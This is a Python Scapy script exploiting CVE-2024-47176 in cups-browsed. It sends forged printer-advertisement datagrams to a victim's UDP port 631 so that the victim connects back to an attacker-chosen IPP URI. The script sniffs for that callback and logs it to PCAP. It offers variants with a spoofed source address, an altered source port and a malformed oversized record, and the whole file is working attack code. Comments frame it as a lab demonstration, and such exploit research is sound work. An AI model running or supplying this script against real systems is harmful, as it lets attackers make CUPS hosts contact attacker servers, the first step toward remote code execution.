#!/usr/bin/env python3
"""Advertise a printer to cups-browsed and record whether the victim calls back.

Sends legacy CUPS browse datagrams (`type state uri "location" "info"`,
CVE-2024-47176) to the victim's UDP/631 using Scapy. cups-browsed parses the
record without authenticating the sender and normally opens an IPP connection
to the advertised URI. The tool sniffs for that callback and exports the whole
exchange to PCAP.
"""

import argparse
import logging
import sys
import threading
import time

from scapy.all import (
    Ether,
    IP,
    Raw,
    TCP,
    UDP,
    conf,
    get_if_hwaddr,
    getmacbyip,
    send,
    sniff,
    wrpcap,
)

LOG = logging.getLogger("cups_attack")

# Browse record layout: <type> <state> <uri> "location" "info".
BROWSE_FMT = '%d %d %s "%s" "%s"'
# TEST-NET-3 address, deliberately unroutable inside the lab: used as the
# forged source in the spoofed-address variant to show that cups-browsed
# accepts advertisements without validating the sender.
SPOOFED_SRC = "198.51.100.10"


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Send crafted CUPS printer-discovery packets and record the victim's reaction.",
    )
    parser.add_argument("target", help="Victim hostname or IP (the cups service)")
    parser.add_argument(
        "--advertise-ip",
        required=True,
        help="Address the victim should call back. Must be routable from the victim.",
    )
    parser.add_argument("--advertise-port", type=int, default=12345)
    parser.add_argument("--target-port", type=int, default=631)
    parser.add_argument("--printer-name", default="Advertised Printer")
    parser.add_argument("--location", default="Lab")
    parser.add_argument("--info", default="Printer")
    parser.add_argument(
        "--variant",
        choices=("baseline", "spoofed-address", "alt-port", "malformed"),
        default="baseline",
        help="Which field manipulation this run is demonstrating.",
    )
    parser.add_argument(
        "--count", type=int, default=1, help="How many discovery packets to send"
    )
    parser.add_argument("--interval", type=float, default=1.0)
    parser.add_argument("--iface", help="Interface to send and sniff on")
    parser.add_argument("--pcap", default="pcap_files/attack.pcap")
    parser.add_argument("--sniff-timeout", type=float, default=5.0)
    parser.add_argument("-v", "--verbose", action="store_true")
    return parser.parse_args(argv)


def browse_uri(args):
    """The printer URI that ends up in the browse record.

    This is the address the victim connects to; it is independent of the
    datagram's own IP source address.
    """
    return "http://%s:%d/printers/%s" % (
        args.advertise_ip,
        args.advertise_port,
        args.printer_name.replace(" ", "_"),
    )


def build_payload(args):
    """The legacy browse record carried in the UDP payload."""
    uri = browse_uri(args)
    if args.variant == "malformed":
        # Invalid type/state numbers, unquoted location, unterminated quote and
        # an oversized field: parser robustness exercise.
        return ('999 -5 %s unquoted-location "%s' % (uri, "A" * 1200)).encode("utf-8")
    return (BROWSE_FMT % (0, 3, uri, args.location, args.info)).encode("utf-8")


def build_discovery_packet(args):
    """Return one Scapy packet advertising a printer to the victim.

    --advertise-ip and --advertise-port are placed inside the browse URI, which
    is what the victim connects to; the UDP/IP headers are manipulated
    separately per variant.
    """
    udp_sport = 631  # legitimate browse datagrams are sent from UDP/631
    if args.variant == "alt-port":
        # Header manipulation: mirror the advertised port in the UDP header.
        udp_sport = args.advertise_port
    ip_src = SPOOFED_SRC if args.variant == "spoofed-address" else None
    return (
        IP(dst=args.target, src=ip_src)
        / UDP(dport=args.target_port, sport=udp_sport)
        / Raw(build_payload(args))
    )


def send_discovery(args, packet):
    LOG.info(
        "sending variant=%s advertise=%s:%s -> %s:%s payload=%r",
        args.variant,
        args.advertise_ip,
        args.advertise_port,
        args.target,
        args.target_port,
        bytes(packet[Raw].load),
    )
    send(packet, iface=args.iface, verbose=False)
    return packet


def collect_callbacks(args):
    """Sniff for a short window after the advertisement.

    The interesting traffic is the victim opening a connection to the
    advertised printer, so the BPF filter is pinned to that destination.
    """
    bpf = "dst host %s and dst port %d" % (args.advertise_ip, args.advertise_port)
    LOG.info("sniffing %.0fs for callbacks (filter: %s)", args.sniff_timeout, bpf)
    packets = sniff(iface=args.iface, filter=bpf, timeout=args.sniff_timeout)
    syns = [
        p for p in packets if TCP in p and p[TCP].flags.S and not p[TCP].flags.A
    ]
    if syns:
        for p in syns:
            LOG.warning(
                "CALLBACK: victim %s:%d initiated TCP to advertised %s:%d",
                p[IP].src,
                p[TCP].sport,
                p[IP].dst,
                p[TCP].dport,
            )
    else:
        LOG.info("no victim callback within %.0fs", args.sniff_timeout)
    LOG.info("captured %d packet(s) after sending", len(packets))
    return packets


def to_wire(args, packet):
    """Add the Ethernet header a sent packet would have had on the wire.

    sniff() returns frames, send() works at layer 3; exporting both to one
    PCAP needs a consistent linktype, so sent packets are framed here.
    """
    iface = args.iface or conf.iface
    try:
        src_mac = get_if_hwaddr(iface)
    except Exception:
        src_mac = "00:00:00:00:00:00"
    dst_mac = getmacbyip(packet[IP].dst) or "00:00:00:00:00:00"
    frame = Ether(src=src_mac, dst=dst_mac) / packet
    frame.time = packet.time  # keep the build time, not the export time
    return frame


def main(argv=None):
    args = parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
    )
    sent = []
    # cups-browsed can call back within a fraction of a second, so the sniffer
    # must already be running when the first datagram goes out.
    holder = {}

    def sniff_run():
        holder["packets"] = collect_callbacks(args)

    sniffer = threading.Thread(target=sniff_run, daemon=True)
    sniffer.start()
    time.sleep(0.5)  # let the BPF filter settle before sending
    for n in range(args.count):
        packet = build_discovery_packet(args)
        sent.append(send_discovery(args, packet))
        if n + 1 < args.count:
            time.sleep(args.interval)
    sniffer.join(timeout=args.sniff_timeout + 2)
    seen = holder.get("packets", [])
    wrpcap(args.pcap, [to_wire(args, p) for p in sent] + list(seen))
    LOG.info("wrote %d packet(s) to %s", len(sent) + len(seen), args.pcap)
    return 0


if __name__ == "__main__":
    sys.exit(main())
